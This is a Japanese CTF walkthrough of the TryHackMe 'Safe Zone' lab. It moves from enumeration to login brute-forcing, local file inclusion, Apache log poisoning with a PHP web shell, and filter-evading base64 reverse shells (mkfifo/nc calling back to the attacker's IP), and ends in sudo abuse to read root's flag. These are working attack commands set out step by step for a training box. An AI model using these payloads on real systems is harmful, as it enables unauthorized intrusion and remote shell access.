# Safe Zone CTF

https://tryhackme.com/room/safezone

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.137.6
root@ip-10-10-70-168:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-10 00:54 BST
Nmap scan report for safezone.thm (10.10.137.6)
Host is up (0.0075s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:63:D5:89:06:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.68 seconds
root@ip-10-10-70-168:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-10 00:54 BST
Nmap scan report for safezone.thm (10.10.137.6)
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:63:D5:89:06:3F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://safezone.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 2372]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/note.txt             (Status: 200) [Size: 121]
/register.php         (Status: 200) [Size: 2334]
/server-status        (Status: 403) [Size: 277]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

- note.txt
```
Message from admin :-

		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

- detail.php をGETすると、index.php にリダイレクトされるが、下記コメントが含まれる。
```html
<!-- try to use "page" as GET parameter-->
```

エラー内容から、自分で登録したユーザーでは権限的にpageパラメータを使えないと思われる。

- ログイン画面は、3回失敗で 60秒待ちが発生するためブルートフォース困難。

- register.php でユーザー登録でき、ログイン画面でログインできる。下記表示。
```
Welcome <username> !
```

- news.php
```
I have something to tell you , it's about LFI or is it RCE or something else?
```

SSTIを疑って下記ユーザー名を作成したが、機能せず。

```
<? phpinfo(); ?>
D{{"ONE"}}E
D{"ONE"}E
${7*7}
```

ギブアップ。

http://safezone.thm/~files/pass.txt

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

これは知っていなければ厳しいタイプ。mod_userdir モジュールの機能。

https://httpd.apache.org/docs/2.4/ja/mod/mod_userdir.html

## パスワードファジング

ログイン画面のブルートフォース防止実装を回避する必要がある。

3回リクエストして60秒スリープして、を繰り返すスクリプトも作れるが・・・、何のひねりもなく、スレッド数2、61秒に1回で ffufを実行。マンガでも読みながら待つ。

```shell
$ seq -w 0 99 > dd.txt

$ ffuf -u http://safezone.thm/index.php -c -w dd.txt -X POST -d 'username=admin&password=adminFUZZadmin&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Please enter valid login details' -p 61 -t 2
```

読み終えたら判明していた。パスワードを使いログイン。

### ファイルインクルージョン

http://safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  でファイル出力可能

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```

detail.php のボックスに yash を入れて実行

```
{"id":"552","username":"yash","password":"yash","is_admin":"false"}
```

これはWeb画面の認証情報で役に立たない。

yash, files の id_rsa は存在しなかった。

## ログポイズニング

http://safezone.thm/detail.php?page=/var/log/apache2/access.log でログの内容が表示される。

bad request を送る。

```shell
$ nc 10.10.229.219 80          
<?=`$_GET[0]`?>
HTTP/1.1 400 Bad Request
Date: Sat, 10 May 2025 08:24:16 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>
```

http://safezone.thm/detail.php?page=/var/log/apache2/access.log&0=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%36%36%36%36%20%3e%2f%74%6d%70%2f%66 でリバースシェル取得成功。

```shell
$ nc -nvlp 6666                
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.229.219] 36948
sh: 0: can't access tty; job control turned off
$ 
```

## 権限昇格１

```shell
www-data@safezone:/var/www/html$ cd /home/files
www-data@safezone:/home/files$ cat '.som[REDACTED]ere'
files:$6$BUr7q[REDACTED]
```

hashcatで割れた。
```shell
.\hashcat -m 1800 hash.txt rockyou.txt
```

昇格成功。（パスワードを使ってSSHでも接続できる）

```shell
www-data@safezone:/home/files$ su files
Password: 
files@safezone:~$ 
```

## 権限昇格２

sudo

```shell
files@safezone:~$ sudo -l
Matching Defaults entries for files on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id
```

id は権限昇格に使えるものではない。  
env_keep の内容は見慣れないが、検索してもChatGPTに聞いても悪用できそうな情報は出てこなかった。

8000,3306 ポートをローカルでリッスンしている。3306はMySQL。

```shell
files@safezone:~$ netstat -pltn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      - 
```

8000ポートにトンネリングして接続したが、forbidden。

```shell
$ ssh -L 8000:localhost:8000 files@10.10.229.219
```

gobusterを実行してみる。

```shell
root@ip-10-10-232-239:~# gobuster dir -x=txt,php -u http://localhost:8000 -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8000
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 178]
/.htaccess.txt        (Status: 403) [Size: 178]
/.htpasswd.txt        (Status: 403) [Size: 178]
/.htpasswd            (Status: 403) [Size: 178]
/pentest.php          (Status: 200) [Size: 195]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/pentest.php を発見。

### pentest.php

何かを入力するとそのまま文字列が表示されるが、id, whoami, php 等のコマンド名はフィルターで削除される。

自分宛てにpingを打つと、無応答になりタイムアウトした。（-cオプションで回数指定しなかったため）

コマンド実行の結果は画面表示されないが、確実に実行はされている。

```shell
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f' | base64
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjIuMjIuMTgyIDg4ODggPi90bXAvZgo=
```

セミコロンが削除されるので、3回に分けて送信
```shell
echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjIuMjIuMTgyIDg4ODggPi90bXAvZgo=' | base64 -d > /tmp/aaa.sh

chmod +x /tmp/aaa.sh

/tmp/aaa.sh
```

リバースシェル取得成功！

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.229.219] 48570
sh: 0: can't access tty; job control turned off
$ 
```

```shell
yash@safezone:~$ ls -al
total 40
drwx------ 5 yash yash 4096 Mar 29  2021 .
drwxr-xr-x 4 root root 4096 Jan 29  2021 ..
-rw------- 1 yash yash    5 Mar 29  2021 .bash_history
-rw-r--r-- 1 yash yash  220 Jan 29  2021 .bash_logout
-rw-r--r-- 1 yash yash 3771 Jan 29  2021 .bashrc
drwx------ 2 yash yash 4096 Jan 29  2021 .cache
drwx------ 3 yash yash 4096 Jan 29  2021 .gnupg
drwxrwxr-x 3 yash yash 4096 Jan 29  2021 .local
-rw-r--r-- 1 yash yash  807 Jan 29  2021 .profile
-rw-rw-r-- 1 yash yash   38 Jan 30  2021 flag.txt
```

```shell
yash@safezone:~$ cat flag.txt
THM{c29.............................}
```

## 権限昇格３

```shell
yash@safezone:~$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

/root/bk.py を実行できるが、パーミッションが無いので内容は不明。

何が何やら分からないが、とりあえず実行してみる。

```shell
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /tmp/root.txt
Enter Password: password

yash@safezone:~$ ls -al /tmp
total 48
drwxrwxrwt 10 root root 4096 May 10 17:21 .
drwxr-xr-x 23 root root 4096 Mar 29  2021 ..
drwxrwxrwt  2 root root 4096 May 10 13:46 .ICE-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .Test-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .X11-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .XIM-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .font-unix
-rwxr-xr-x  1 yash yash   74 May 10 17:14 aaa.sh
prw-r--r--  1 yash yash    0 May 10 17:21 f
-rw-r--r--  1 root root   38 May 10 17:21 root.txt
drwx------  3 root root 4096 May 10 13:46 systemd-private-6cb4cca3c34c4ad79a881429b548d02a-apache2.service-ZdPucP
drwx------  3 root root 4096 May 10 13:46 systemd-private-6cb4cca3c34c4ad79a881429b548d02a-systemd-resolved.service-ulXx4N
drwx------  3 root root 4096 May 10 13:46 systemd-private-6cb4cca3c34c4ad79a881429b548d02a-systemd-timesyncd.service-ySOh6D

yash@safezone:~$ cat /tmp/root.txt
THM{63................................}
```

ファイル名もパスワードもあてずっぽうで入れたら一発で成功して唖然。

パスワードは何でも良いらしい。

```shell
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /tmp/root-2.txt
Enter Password: secret

yash@safezone:~$ ls -al /tmp
total 52
drwxrwxrwt 10 root root 4096 May 10 17:23 .
drwxr-xr-x 23 root root 4096 Mar 29  2021 ..
drwxrwxrwt  2 root root 4096 May 10 13:46 .ICE-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .Test-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .X11-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .XIM-unix
drwxrwxrwt  2 root root 4096 May 10 13:46 .font-unix
-rwxr-xr-x  1 yash yash   74 May 10 17:14 aaa.sh
prw-r--r--  1 yash yash    0 May 10 17:23 f
-rw-r--r--  1 root root   38 May 10 17:23 root-2.txt
-rw-r--r--  1 root root   38 May 10 17:21 root.txt
drwx------  3 root root 4096 May 10 13:46 systemd-private-6cb4cca3c34c4ad79a881429b548d02a-apache2.service-ZdPucP
drwx------  3 root root 4096 May 10 13:46 systemd-private-6cb4cca3c34c4ad79a881429b548d02a-systemd-resolved.service-ulXx4N
drwx------  3 root root 4096 May 10 13:46 systemd-private-6cb4cca3c34c4ad79a881429b548d02a-systemd-timesyncd.service-ySOh6D
```

## 振り返り

- `http://safezone.thm/~files/pass.txt` このパターンは知らなかったので覚えておきたい。自分にとってはここが一番難しかった。
- コマンド名がフィルタリングされているときに、Base64デコードしつつシェルファイル作成、実行する手口は実用的なのですぐ思いつくようにしたい。
- 最後、パスワード入力を求められたときにあきらめて Ctrl+C を押さないでよかった。
